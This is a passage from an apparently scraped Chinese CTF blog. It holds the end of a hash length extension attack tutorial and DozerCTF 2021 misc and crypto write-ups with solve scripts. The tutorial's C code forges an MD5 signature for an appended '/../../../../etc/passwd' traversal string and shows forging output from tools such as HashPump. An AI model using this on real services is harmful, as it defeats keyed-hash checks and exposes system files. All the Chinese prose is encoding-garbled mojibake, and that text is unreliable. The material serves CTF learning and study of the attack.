çš„é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦æ˜¯åœ¨è¡¥ 1 å’Œ 0 ä»¥å‰çš„é•¿åº¦ï¼Œå¦‚æœé•¿åº¦è¶…å‡ºäº† 64bitï¼Œé‚£ä¹ˆå°±å–ä½ 64bitã€‚æ¢å¥è¯è¯´ï¼šè¡¥å®Œçš„ä¸€ä¸ªå—å¯èƒ½æ˜¯è¿™ä¸ªæ ·å­çš„ï¼š raw_data + &#39;\\x80&#39; + &#39;\\x00&#39;*n + &#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39; ç¬¬ä¸€ä¸ª raw_data çš„éƒ¨åˆ†å°±æ˜¯åŸå§‹çš„æ•°æ®ï¼Œç¬¬äºŒä¸ªéƒ¨åˆ† \\x80 æ˜¯ä¸€å¼€å§‹è¡¥çš„ä¸€ä¸ªäºŒè¿›åˆ¶ä½ 1ï¼Œæ¥ç€è¡¥è‹¥å¹²ä¸ª \\ x00ï¼Œç›´åˆ°æ•´ä¸ªé•¿åº¦è¾¾åˆ° 56Byteï¼Œæœ€åçš„ 8Byte å°±æ˜¯ raw_data çš„é•¿åº¦ï¼Œå¦‚æœ raw_data çš„é•¿åº¦è¶…è¿‡äº† 2^64bitï¼Œåˆ™å–ä½ 64bitã€‚ MD5 ç®—æ³•ä¸­çš„è¡¥ä½çš„è¿™éƒ¨åˆ†ï¼Œå°±æ˜¯å®ç°é•¿åº¦æ‰©å±•æ”»å‡»çš„å…³é”®ã€‚ é€šè¿‡é•¿åº¦æ‰©å±•æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ md5 çš„ä¸€äº› trick ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚è¿™ä¸ªé—®é¢˜å®é™…ä¸Šå˜æˆäº†ï¼šå¦‚ä½•åœ¨ä¸çŸ¥é“ salt/key/secret çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—å‡ºä¸€ä¸ªæ–‡ä»¶åçš„åˆæ³• hash å€¼ã€‚ é€šè¿‡å‰é¢å¯¹ md5 ç®—æ³•çš„äº†è§£ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå½“ä¸€ä¸ªå—è®¡ç®—å®Œæˆåï¼ŒABCD å››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼å°±æ˜¯åˆšè®¡ç®—å®Œçš„ hash å€¼ï¼Œå¦‚æœåé¢è¿˜æœ‰æ•°æ®å—ï¼Œé‚£ä¹ˆä¼šåœ¨å·²æœ‰çš„ ABCD å››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼ä¸Šè¿›è¡Œæ›´æ–°ã€‚ é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å°† ABCD å››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼è®¾ç½®ä¸º test.pdf å¯¹åº”çš„ hash å€¼ï¼Œé‚£ä¹ˆå°±ç›¸å½“äº MD5 çš„è®¡ç®—è¿‡ç¨‹ä¸­ï¼Œå·²ç»å®Œæˆäº†å¯¹å‰ä¸€ä¸ªå—çš„è®¡ç®—ï¼Œæ¥ç€å‘ä¸‹è®¡ç®—å°±å¯ä»¥äº†ã€‚ 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;openssl/md5.h&gt;int main(int argc, const char *argv[])&#123; int i; unsigned char buffer[MD5_DIGEST_LENGTH]; MD5_CTX c; MD5_Init(&amp;c); MD5_Update(&amp;c, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;, 64); c.A = 0x9b104365; c.B = 0xf78738b5; c.C = 0x42fe46bb; c.D = 0x4ae2264f; MD5_Update(&amp;c, &quot;/../../../../etc/passwd&quot;, 23); MD5_Final(buffer, &amp;c); for (i = 0; i &lt; 16; i++) &#123; printf(&quot;%02x&quot;, buffer[i]); &#125; printf(&quot;\\n&quot;); return 0;&#125; é‡Œé¢çš„ 64 ä¸ª A æ— æ‰€è°“æ˜¯ä»€ä¹ˆï¼Œåªæ˜¯ä¸ºäº†è®© MD5 è¿›è¡Œä¸€ä¸ªå—çš„è®¡ç®—ï¼Œç„¶åæˆ‘ä»¬å°†å››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼æ”¹æ‰ï¼Œæ³¨æ„å¤§å°ç«¯ã€‚ç„¶åè®¡ç®—é™„åŠ æ•°æ®çš„ MD5ã€‚ å·¥å…· HashPumpï¼šhttps://github.com/bwall/HashPump 123456789101112131415$ hashpump -hHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength] HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack. -h --help Display this message. -t --test Run tests to verify each algorithm is operating properly. -s --signature The signature from known message. -d --data The data from the known message. -a --additional The information you would like to add to the known message. -k --keylength The length in bytes of the key being used to sign the original message with. Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support. &lt;Developed by bwall(@botnet_hunter)&gt; $ hashpump -s &#x27;6d5f807e23db210bc254a28be2d6759a0f5f5d99&#x27; --data &#x27;count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo&#x27; -a &#x27;&amp;waffle=liege&#x27; -k 140e41270260895979317fff3898ab85668953aaa2count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02(&amp;waffle=liege hash_extenderï¼šhttps://github.com/iagox86/hash_extender 12345let secret = &quot;secret&quot;let data = &quot;data&quot;let H = md5()let signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5blet append = &quot;append&quot; 12345$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5Type: md5Secret length: 6New signature: 6ee582a1669ce442f3719c47430dadeeNew string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64 hexpandï¼šhttps://github.com/amlweems/hexpand 1234567891011121314Usage: hexpand -t type -s signature -l length -m message hexpand --testOptions: -t --type the hash algorithm for expansion (md5, sha1, sha256, or sha512 -s --sig the result of the original hash function -l --length the length of the original message -m --message the message to be appended --test runs a set of test cases $ ./hexpand -t md5 -s cd9fb5c3a20e29b2b2846deaa845c426 -l 55 -m &quot;\\nP.S. Tell Eve our secret plan&quot;Append (hex): 80b8010000000000005c6e502e532e2054656c6c20457665206f75722073656372657420706c616e2eSignature: 69b0e397b5588c86aa9751b56f2c6943 å‚è€ƒ å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"hash","slug":"hash","permalink":"https://lazzzaro.github.io/tags/hash/"}],"author":"Lazzaro"},{"title":"DozerCTF 2021","slug":"match-DozerCTF-2021","date":"2021-05-30T14:23:15.000Z","updated":"2021-05-30T16:54:45.628Z","comments":true,"path":"2021/05/30/match-DozerCTF-2021/","permalink":"https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/","excerpt":"","text":"â€‹ æ¯”èµ›æ—¶é—´ï¼š2021å¹´5æœˆ29æ—¥ 9:00-2021å¹´5æœˆ30æ—¥æ™š21:30æ¯”èµ›å¹³å°ï¼šhttp://1.14.160.21:8000/ Webå‡ ä¹å…¨æ˜¯åŸŸæ¸—é€ï¼ŒCryptoå‡ ä¹å…¨æ˜¯AESã€‚ Rank: 12 Miscä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§ æ¬¢è¿å‚åŠ DozerCTF 2021 https://www.bilibili.com/video/BV1VK4y1G7HQ è§†é¢‘ä¸­åæ®µæœ‰é—ªè¿‡çš„flagï¼Œæ‹¼æ‰‹é€Ÿæš‚åœå¤§æ³•ã€‚ â€‹ detective_novel å¬è¯´æ‰«ä¸€æ‰«å°±æœ‰flag flag.png åˆ†ç¦»å‡º zipå‹ç¼©åŒ…ï¼Œåœ¨ novel ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ flag.jpg å’Œ hint.pngã€‚ hint.png åˆ†ç¦»å‡ºå¦ä¸€ä¸ª zipå‹ç¼©åŒ…ï¼Œæ£€æŸ¥å‘ç°å¤´éƒ¨é”™è¯¯ä¸”åŒ…å«ä¼ªåŠ å¯†ï¼Œä¿®å¤å¤´éƒ¨ 504B03040A000900 ä¸º 504B030414000000 ï¼Œåœ¨ easy_riddle ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ hint.txt å’Œ letter.pngã€‚ letter.png ç¦å°”æ‘©æ–¯ä½¿ç”¨è¿‡çš„è·³èˆå°äººå¯†ç ï¼Œè§£å‡º DOZERï¼Œå†ç»“åˆä¹‹å‰ hint.png å†…æ–‡å­— guess what can you get !!!ï¼Œç”¨ outguess ä» flag.jpg æå–æ–‡ä»¶å¾—flagï¼š outguess -r flag.jpg -k DOZER -t out.txt â€‹ ezmisc çœ‹ä¸åˆ°çœ‹ä¸åˆ° xiaojiejie.jpg åˆ†ç¦»å‡ºä¸€å¼ gifå›¾ç‰‡å’Œä¸€å¼ pngå›¾ç‰‡ã€‚ gifå›¾ç‰‡åˆ†å¸§åˆ†åˆ«æ‰«äºŒç»´ç æ‹¼æ¥å¾—å‰åŠæ®µ Dozer&#123;is_it_simpleï¼ŒpngäºŒç»´ç å›¾ç‰‡æ‰«ç å‘ç°æ–‡å­—ä¸­é—´æœ‰ä¸å¯è§å­—ç¬¦ï¼ŒçŒœæµ‹ä¸ºé›¶å®½éšå†™ï¼Œä½¿ç”¨ unicode_steganography æå–å­—ç¬¦ï¼š 123var s = unicodeSteganographers.setUseChars(&#x27;\\u200b\\u200c\\u200d\\u200e\\u200f&#x27;);s.decodeText(&quot;æˆ‘å·²ç»çœ‹è§äº†ï¼Œâ€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€‹â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€Œâ€Œâ€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€‹â€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€Œâ€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€‹â€Œâ€‹â€‹â€‹â€Œâ€‹â€‹â€‹ä½ å‘¢ï¼Ÿ&quot;) è§£å‡ºååŠæ®µ _for_you!congratulate&#125; â€‹ funny_pixel å¬è¯´å›½èµ›æœ‰ä¸€ä¸ªrunning_pixel? æŒ‰æç¤ºå‚è€ƒciscné¢˜ï¼Œæå–218å¼ å›¾ç‰‡é‡Œçš„0/1ï¼Œå¯æŒ‰ç…§0/1å›¾æ¡ˆé¢œè‰²ï¼ˆRGB: EFEF27ï¼‰è®¡ç®—åƒç´ æ•°æ¥è¯†åˆ«ï¼š 12345678910111213141516171819from PIL import Imageflag = &#x27;&#x27;for name in range(1,219): count = 0 framepic = Image.open(f&quot;./funny_pixel/&#123;name&#125;.png&quot;) framepic = framepic.convert(&quot;RGB&quot;) width,height = framepic.size for w in range(width): for h in range(height): if framepic.getpixel((w,h)) == (0xef,0xef,0x27): count += 1 print((name,count)) if count != 10 and count != 5: print(name) break flag += &#x27;0&#x27; if count == 10 else &#x27;1&#x27; #01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111 è§‚å¯Ÿå¾—åˆ°çš„0/1å­—ç¬¦ä¸²ï¼Œ1000100 = Dï¼Œ1101111 = oï¼Œç±»æ¨çŸ¥æ¯ä¸ªå­—ç¬¦7ä½äºŒè¿›åˆ¶ä¸­é—´ç”¨0åˆ†éš”ï¼Œæå–è½¬å›å­—ç¬¦å³ä¸ºflagï¼šDozerCTF&#123;D0_yOU_LIke_PixEl&#125;ã€‚ â€‹ ä¸€ç‚¹ä¹Ÿä¸æ‚ å‡ºé¢˜äººè¯´ï¼Œè¿™ä¸ªé¢˜ç›®ä¸€ç‚¹ä¹Ÿä¸æ‚ ä¸‰ä¸ªæ–‡ä»¶ï¼Œflagåˆ†ä¸‰éƒ¨åˆ†ã€‚ ç¬¬ä¸€éƒ¨åˆ†ï¼Œ5æœˆæ—¥å†+å›¾ç‰‡å°¾éƒ¨13ç»„æ•°å­—ï¼Œåœ¨æ—¥å†ä¸Šè¿çº¿å‡ºçŒªåœˆå¯†ç å›¾æ¡ˆï¼Œå¯¹ç…§è§£å‡º DOYOUKNOW_CRTã€‚ ç¬¬äºŒéƒ¨åˆ†ï¼Œç®€å•ä¸­å›½å‰©ä½™å®šç†(CRT)åº”ç”¨ï¼ŒSageè¿è¡Œcrt([2,2,9,16],[5,7,17,23])ï¼Œå¾—key=5007ã€‚ ç¬¬ä¸‰éƒ¨åˆ†ï¼Œç›´æ¥base85è§£ç å¾— _good_over&#125; åŠ å¤´ DozerCTF&#123; æ‹¼æ¥ä¸ºflagã€‚ â€‹ åšä¸ªé—®å·å§ èµ›é¢˜åŸºæœ¬ä¸Šçº¿å®Œæ¯•ï¼Œæ„Ÿè°¢å‚åŠ DozerCTF 2021! é—®å·ï¼šhttps://tp.wjx.top/vj/t2bF3sc.aspx åé¦ˆ+åæ§½ã€‚ â€‹ CryptoHorcrux Harry Potter &amp;&amp; Aquila AeroCTF 2021åŸé¢˜ï¼Œæ„é€ ç»“å¼è§£æ¤­åœ†æ›²çº¿æ–¹ç¨‹ç»„+LLLç®—æ³•+æ¢å¤å‚æ•°å€¼ï¼Œå‚è€ƒï¼š AeroCTF 2021 - Horcrux 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122from sage.all import *proof.arithmetic(False)p = 0x95a599ab706381e861caf2c6e757204c704b77a38592ae0db282000d8537ab0e4608ecd9a524ad6e14eb9564353b5c1036ff13c8503bfad7e8695d0bcf15df766c1be64aa4e73b75e0ecb28ea9e74eafc613d2fb9299fac060826bd071a92d2bd5be44d6d65e6b63146d617e800b79e25358b4a3e22a62457f2d39c21a694f54c03ad5d69a674fa6cd91c2971524152c1b6d177c455e0f255ce4fa18253da252613959c17b49ac422a9009933d0c59210646fca85e8ae35d5df34d6afde9d951909585c3f3e53e06ef5ae319fa035e57941599c2a73133bba490b66ab38e7537fd3ed322bf3a0431f02f276b5b18b623865883e3f0b67a511293b5a7576c97e6663cb1c32bdff5cda825549742d067e1b4ca847c75ef6b601feced3a9bb4dea41f1e5c40a8f2af2983f010d7bbc9ba992cedcdac6922a056d52873af110ae578da5e875fa6a121cdb45fe5e8198c121f7e9609d100d023a9155d6aa9efe28aa9036079564780db663aad36796ee8349b98b11d1b108125F = GF(p)x0 = F(0x93436a2bdfecc923d69385f164ef891ef5b08418e5b4e65c980e0b054e86ee8b8e24a527dad9fe3883234179167ada4b5f413c07c548f3dc224db1f2791c8a44bb857c722676d621fa07ad4beee4dc2be679c351cc19423aaff444e5c908b767d9ebec006bf0f020b8c0d15775fc84524333c47d4bc46ae8bd3cb18e1b037e59a388e39a81c1d97c9654742979ed54741df9aba6954c2801efb63d91ed1a51889ee1e8848b7bf111c987cb558e08b9caa17e50f578fa0af70bf855393dcc6c52420897eae663700818dbec237e094c1d4904a249d92702ab4046e52694db73a5fb83953262dff0251fa5fd1b4a99fb70addcde2a38d8766e02360b7b29aad1382ecdd63650f2b597469267dccc11ee7d0b10178c68a02b2d03db5bfcd6d663c11bc2ef855e30528aec48a9f4f53f71c52ac6e0c92fcaf0f8576982b1135bbb15fb5035c7853de51b8aa5b858646dd23b7b01d837c6b3c38f4bdcef6009ee02456bbdcbe8978eb400326c4fd0a899ed9f559ba963b25317)y0 = F(0x47b8c9d33929bfe12657a2f482213cca803fe37e8485ebde814dc91ce56ed480cea04f24176edce77ebfd7d9bba3a864cfe6176ef1d68ebc184dcde0667704adc472d1d16688affa657cff460edf05f92dad743ca3421150ec7ef98e08a9d17af033a555ed49f0e9c7457bf339a9270e8b44b7b75dd43afd27614d0ce59878c019d902d9ed23a26f04a431130534f85b05db586fd9a65a178204eb7d568a0e64dd16a369d2af6f2b8cd32a9e9be8322885c78a30dc8019ca3c48f39bad38de4ab60970ee1c44688d2afa901f46af7d2e7ced0e34204d6b38330fd87d6bf5bb61378e092780a48b985654de1c65b0a6146a82f84bfe09359820942980ce5c607bfc14497a79436bc4f351ae697875d93049c30dafc698208a17f9b785aa35448e4ef341102053c62a9923287f4cf597ff492fd0eac4ef77ae879a22c6c8a3a53baef09f574316fd872e1a6dd1ad9eb72a3e39f925e25fe06f7983b785dcb110bd127c8e2736e7345fd7ffce687c66c492a541e00c500574)x1 = F(0x37a181d88a683e2eeba3147bfb3043be6067fc722b8578255e25a335fadda9ead31c41d7742dbf3df7e4c3effc9297ef528730b3d8920978e342e123b9f19ab15a5ed2c19c45aaee728e53acd8c44e7543c4b9bcd40f27b8efac1a1e431ddbab15b4341c6cc817516634c2ab1117e784e429b9f797963b18442127342455d469ca9d9ff24b241afe9b7fdd4b91bb9750710e6f00b9fe631c1db71c308ef4642251fc00d0433910161d588c100944d55935ddf7dc656cc1670065c5bc6607358304c228f8495cca579a3a78102b4e617687f3aad0c5826e3aa7a85c85c99af2254002d3578c0af342ea1f49b9a425eba90e2473470fec77a945b45cf67dde9cb4e0ef445b974164cbcb61ec7cbcd77c94d42c6dce15ae500e4b6b15d38923ba2773176ae1e3354baaae47b422ec0ff8273538ad0a6a03a33d60a52257698130f6db6baaa4d338e167443eb4ac1b57b0d6f424e9d0b2f6b6b0df609b81150928286443afe7d1b9bbb30389af0db1597945d233cd19121d11)y1 = F(0x7696ea73e7345896be516aac44aa8ba35242babc3853a2a3fbf7081a3f5a845dba81f01d7aba946f7a9886eb1918d367baa87f387e86e095bb88bbc44f58768e8c2db3a1926301c984ea19f8e680fb7f4f7108c4c8565fc7cb66284bdf81e547e446faa80e88a59ceae3bb43b2c6ac1f8858e5f126fcc224f62aef611184d714db86a5c19060e0a9844def0e047d3a46e9d64f42c0cef9f85812068d580f9722b1520c2847b34c6ed7afc89b633113606aa397c10f1ea653e4d15fb160f2c1d4750a6c4eaef7e6fa56c35d393fe7d3ef91fc9ea56a69fd9614e8c39da6dc0981c6004468db1d81a13ebaf3bfd9e640c39b63b107605ba28a5c18b4a03ca627102ff63ddc8483dce2c06e97f614a4d93f9d615f849a6ce0c164217dabe849ceaf1ade997700daf9aca95f7811cc615cf61887e199ddf963a780829cc186b96d96f2b3c1f001eaa0e289b7fc79e5c24ce2aad55f9adb9ecaacba5445773222aee3cf997c171f7bcbcba65caa6c254186a1fa1982521d8ab1)x2 = F(0x3117ba57d46bd2da19fed7e3f087ec252b45340c1a338a5096a94538be0f9776388ec70cc22c475968a352f2a34f1637b660aea2f5a741d925d550b9bc91f3b5da0e9b6585aee5413d89f6734651439f7c6905c2b98b7e4aef425a50852b626ad7bd2a4f67909acc0d6ac7e33688f3cf676ac3c00a32e12eecb384cd9b099244c2ef37f054a271a2c174f3eac5553415b097ee84b590258df022d1142b28be0ca756784bfae2e42a1bf98a3c48ea9baa2466172673b978d1372a2ac5e20ff869dacbbfe0f56d4d4de947d39a5bb643cd3b00c1e6d4b82e090105358fc105f75ee1dec962696ef406474d5934ed27e375952012bf797ebd8fff2d4b08935086850fc89039b3c4c0ab712a9859c6e43dad3fae4c5048d60a5069c338a63ac49f3a7fa99614bd8a17a9522c82333ecaf88c41b0b8be60ebee5b52df4d853ef397786a113b5064e236299e795dbec72baf001c6dd973e424e86e79368d6b10f3b43a47eb8fae6e48c2b42aa7e2566879f9b675e4837a59366b)y2 = F(0x1e6d85c241d60abc738c606cc4237a617f7a341934d59cd0a3becbb1f4acdc740673a84df7646d1afd08d0d132d8188a35eca0ca8bee5208b73b141de1c4a4a254c6f6278f6860d8d40d9eb301281373dadb1e9bfbeeaa4b0b1ef48b787b47a490cce2f2c64d03a61036ebe565fe4f93dec2e030ecf1a91d1c65b82dfca045b07c526a87293d4844d92327669ca19a2a2e62d4e6e9d46d24d0994434e52f2ea1e9492d46039959afa75365d88e90ab13097f075c4a93d102514cac901ca760155152788e5d352c09e012f6d87fb262d3db9174014c2d9c88e289c902700dc202b05c0600b3f96be0ffc10ae58738718fee7c21e387ddf390a9a1e26a6cb2b744971b67621c1211f0127969a969318beb60a361b924db7707b4170ed3af22dc412d15eb71c553dc79dbebc238dc2baecea806351288b05db9f6885cc53af7509aa3c810540e648ff5e94ba75bf0dbf097d515babe0f99dcd4ddcc10f7a6549a3f12148ca51e4f4f5ab16bf0cb5c069b2cd87c1738bce308)BITS = 32R = PolynomialRing(F, names=&#x27;aa1, aa2, bb1, bb2, a, b&#x27;)aa1, aa2, bb1, bb2, a, b = R.gens()bounds = dict(aa1=2**BITS, aa2=2**BITS, bb1=2**BITS, bb2=2**BITS)eq0 = x0**3 + a*x0 + b - y0**2eq1 = (x1 + aa1)**3 + a*(x1 + aa1) + b - (y1 + bb1)**2eq2 = (x2 + aa2)**3 + a*(x2 + aa2) + b - (y2 + bb2)**2def resultant(p1, p2, var): p1 = p1.change_ring(QQ) p2 = p2.change_ring(QQ) var = var.change_ring(QQ) r = p1.resultant(p2, var) return r.change_ring(F)poly = eq0poly1 = resultant(poly, eq1, b)poly2 = resultant(poly, eq2, b)poly = resultant(poly1, poly2, a)poly /= poly.coefficients()[0]print(poly.monomials())bits = 0for mono in poly.monomials(): mono_bits = RR(log(mono.change_ring(ZZ).subs(**bounds), 2)) print(mono, &quot;%.2f&quot; % mono_bits ) bits += mono_bitsn = len(poly.monomials())m = matrix(ZZ, n, n)m[0] = vector(poly.coefficients())m[1:,1:] = p * identity_matrix(n-1)def prmat(m): for row in m: print(*[&#123;0: &quot;0&quot;, 1: &quot;1&quot;, p: &quot;p&quot;&#125;.get(v, &quot;x&quot;) for v in row])prmat(m)monos = vector(poly.change_ring(ZZ).monomials())factors = [mono(**bounds) for mono in monos][m.rescale_col(i, factor) for i, factor in enumerate(factors)]m = m.LLL()m = m.change_ring(QQ)[m.rescale_col(i, QQ(1)/factor) for i, factor in enumerate(factors)]m = m.change_ring(ZZ)polys = []for pol in m*monos: maxval = sum( (abs(int(coef)) * mono).change_ring(ZZ).subs(**bounds) for coef, mono in pol ) print(&quot;polynomial with max value&quot;, RR(log(maxval, 2)), &quot;bits&quot;) if maxval &lt; p: polys.append(pol)print(&quot;got&quot;, len(polys), &quot;polynomials&quot;)def recover(hs, vars, solbits, padbits=20): nbits = solbits + padbits from itertools import product sols = &#123;(0,) * len(vars)&#125; polys = [h.change_ring(Zmod(2**nbits)) for h in hs] for i in range(nbits): print(&quot;bit&quot;, i, &quot;/&quot;, nbits, &quot;:&quot;, len(sols), &quot;candidates&quot;) sols2 = set() mod = 2**i polys = [h.change_ring(Zmod(2*mod)) for h in hs] for bits in product(range(2), repeat=len(vars)): for sol in sols: sol2 = tuple(ss + bit*mod for ss, bit in zip(sol, bits)) if any(poly(*sol2) for poly in polys): continue sols2.add(sol2) sols = sols2 if not sols: print(&quot;fail&quot;, i) return print(&quot;sols?&quot;, i, len(sols)) # TBD: automate adding pad bits to determine right sols by smallness for sol in sols: # fix signs sol = [v if v &lt; 2**(nbits-1) else (v-2**nbits) for v in sol] # too large solution if any(abs(v) &gt;= 2**solbits for v in sol): continue # wrong solution if any(poly(*sol) for poly in hs): continue yield sol R = PolynomialRing(ZZ, names=&#x27;aa1, aa2, bb1, bb2&#x27;)polys = [R(pol) for pol in polys]sols = list(recover(polys[:4], R.gens(), BITS))from struct import packct = bytes.fromhex(&quot;1df819824bb4299817560c5ee69bd8eaabaf3c47e33a57e39eb1ccddec66d9fb38c6df8ebf35b368ebeecd803d66afb2&quot;)sol_aa1, sol_aa2, sol_bb1, sol_bb2 = sols[0]parts = [ (int(x1)+int(sol_aa1))^^int(x1), (int(y1)+int(sol_bb1))^^int(y1), (int(x2)+int(sol_aa2))^^int(x2), (int(y2)+int(sol_bb2))^^int(y2),]key = pack(&quot;&gt;4I&quot;, *parts)print(AES.new(key, mode=AES.MODE_ECB).decrypt(ct).decode())#DozerCTF&#123;B3y0ND_ThE_4QUIL4_2IFT&#125; â€‹ æ‰‹æ»‘çš„è¢å­¦é•¿ è¢å­¦é•¿å‡ºé¢˜çš„æ—¶å€™ä¸å°å¿ƒæŠŠå¯†æ–‡ç»™åˆ æ‰å‡ ä½ï¼Œç°åœ¨ç”¨$æ›¿æ¢äº†ä¸€ä¸‹ï¼Œå‡‘æ´»çœ‹å§ ä»£ç é€»è¾‘ï¼š 123456789101112131415161718192021plain:I do not care the result2?9cf037f8b3a?2b19b5bda978c294?5\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00key:2?9cf037f8b3a?2b19b5bda978c294?5encrypt:91e5fb43f053b21ce12e41df0b0ae0bb6a20c55719151$$fccecb4$$$$$2a27c8c582c6704f$$$$153bd3313b84235ace16a7b3b190$e487abfa9$cf379d1a3calgorithm:c1 = AES(key, p1^f2), e1=c1^f1c2 = AES(key, p2^c1), e2=c2^p1c3 = AES(key, p3^c2), e3=c3^p2c4 = AES(key, p4^c3), e4=c4^p3flag = f1+f2 ä» key å’Œ e4 å…¥æ‰‹çˆ†ç ´ï¼ŒæœªçŸ¥ä½æ•°3+2=5å±‚å¾ªç¯ï¼ˆ16^5=1048576ï¼‰ï¼Œæ ¹æ®å·²çŸ¥æ¡ä»¶ï¼Œæšä¸¾æ±‚å‡ºflagï¼š 123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.strxor import *from Crypto.Cipher import AESimport stringdic = &#x27;0123456789abcdef&#x27;def xor_hex(s, t): return strxor(bytes.fromhex(s),bytes.fromhex(t)).hex().rjust(32,&#x27;0&#x27;)for key1 in dic: for key2 in dic: for key3 in dic: key = &#x27;2&#123;&#125;9cf037f8b3a&#123;&#125;2b19b5bda978c294&#123;&#125;5&#x27;.format(key1,key2,key3) p1 = b&#x27;I do not care th&#x27;.hex() p2 = b&#x27;e result&#x27;.hex() + key[:8].encode().hex() p3 = key[8:24].encode().hex() p4 = key[24:].encode().hex() + &#x27;08&#x27;*8 for e41 in dic: for e42 in dic: e4 = &#x27;e16a7b3b190&#123;&#125;e487abfa9&#123;&#125;cf379d1a3c&#x27;.format(e41,e42) c4 = xor_hex(e4, p3) c3 = xor_hex(p4, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c4)).hex()) #e3 = 8c582c6704f$$$$153bd3313b84235ac e3 = xor_hex(c3, p2) if e3.startswith(&#x27;8c582c6704f&#x27;) and e3.endswith(&#x27;153bd3313b84235ac&#x27;): c2 = xor_hex(p3, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c3)).hex()) e2 = xor_hex(c2, p1) #e2 = 6a20c55719151$$fccecb4$$$$$2a27c if e2.startswith(&#x27;6a20c55719151&#x27;) and &#x27;fccecb4&#x27; in e2 and e2.endswith(&#x27;2a27c&#x27;): c1 = xor_hex(p2, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c2)).hex()) e1 = &#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27; f1 = xor_hex(e1, c1) f2 = xor_hex(p1, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c1)).hex()) print(bytes.fromhex(f1)+bytes.fromhex(f2)) #hei_my_bro_this_is_flag_you_know â€‹ strange encrypt å­¦é•¿å­¦å§è¯´è¿™é¢˜åº”è¯¥ä¸éš¾å§ï¼Ÿ å·²çŸ¥ fl4g å’Œ640æ¬¡AESåŠ å¯†åçš„ fl4g_encï¼Œ640ä¸ªç”Ÿæˆçš„key æŒ‰ extend_secret äºŒè¿›åˆ¶ä½é€‰æ‹©å‰åŠæ®µæˆ–ååŠæ®µä½œä¸ºæ¯è½®AESä½¿ç”¨çš„ keyã€‚ å·²çŸ¥10ä½ secret çš„å‰ä¸¤ä½ï¼Œå¯¹åº”æ‰©å±• extend_secret ä¸ºï¼š 123456extend_secret:s1=[?,?,?,?,7]s2=[8,?,?,?,?]p1=(xxxx xxxx xxxx xxxx 0111)*16p2=(1000 xxxx xxxx xxxx xxxx)*16ex=p1+p2 é‡‡ç”¨ä¸­é—´äººæ”»å‡»(MITM)ï¼Œæšä¸¾ s1 ä¸­æœªçŸ¥4ä½å¾—åˆ°fl4g AESåŠ å¯†32æ¬¡çš„å¯èƒ½å€¼ï¼ˆ16^4=65536ï¼‰ï¼Œå†æšä¸¾ s2 ä¸­æœªçŸ¥4ä½å¾—åˆ° fl4g_enc 